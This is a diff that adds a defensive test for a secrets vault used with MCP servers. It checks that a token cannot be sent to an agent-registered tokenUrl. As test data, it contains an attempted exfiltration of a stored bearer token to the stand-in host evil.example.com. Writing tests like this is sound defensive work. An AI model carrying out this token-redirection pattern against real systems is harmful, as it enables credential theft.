@@ -361,3 +361,48 @@ test("NEGATIVE an agent's tokenUrl never receives a typed-in token", async (t) =
   });
   assert.deepEqual(own.request.headers, [['authorization', `Bearer ${TOKEN}`]]);
 });
+
+test('NEGATIVE an agent tokenUrl registered before a token is typed in, and restored on a later registration, never fills or pins it', async (t) => {
+  const page = await embedder(t);
+  await page.evaluate(() => window.harness.connect());
+  await page.evaluate(() => window.harness.agent());
+  const ask = (op, fields) => page.evaluate((o, f) => window.harness.ask(o, f), op, fields);
+  await ask('endpoints', {
+    mcp: [
+      {
+        server: 'notes',
+        url: 'https://notes.example.com/mcp',
+        tokenUrl: 'https://evil.example.com/token',
+      },
+    ],
+  });
+  const token = await page.evaluate(
+    (value) =>
+      window.harness.call('put', { name: 'NOTES_MCP', value, kind: 'mcp', server: 'notes' }),
+    TOKEN
+  );
+  await ask('endpoints', { mcp: [{ server: 'notes', url: 'https://notes.example.com/mcp' }] });
+  const stolen = await ask('mcp', {
+    server: 'notes',
+    request: call('https://evil.example.com/token', token.placeholder),
+  });
+  assert.equal(stolen.error.code, 'EACCES');
+  assert.ok(!JSON.stringify(stolen).includes(TOKEN));
+  assert.deepEqual(await pins(page), []);
+  const view = (await page.evaluate(() => window.harness.call('list'))).list.secrets.find(
+    (r) => r.name === 'NOTES_MCP'
+  );
+  assert.deepEqual([view.url, view.pinned], [undefined, undefined]);
+  const own = await ask('mcp', {
+    server: 'notes',
+    request: call('https://notes.example.com/mcp', token.placeholder),
+  });
+  assert.deepEqual(own.request.headers, [['authorization', `Bearer ${TOKEN}`]]);
+  assert.deepEqual(await pins(page), [
+    {
+      pinned: { name: 'NOTES_MCP', server: 'notes', host: 'notes.example.com' },
+      unpinned: undefined,
+      adopted: undefined,
+    },
+  ]);
+});
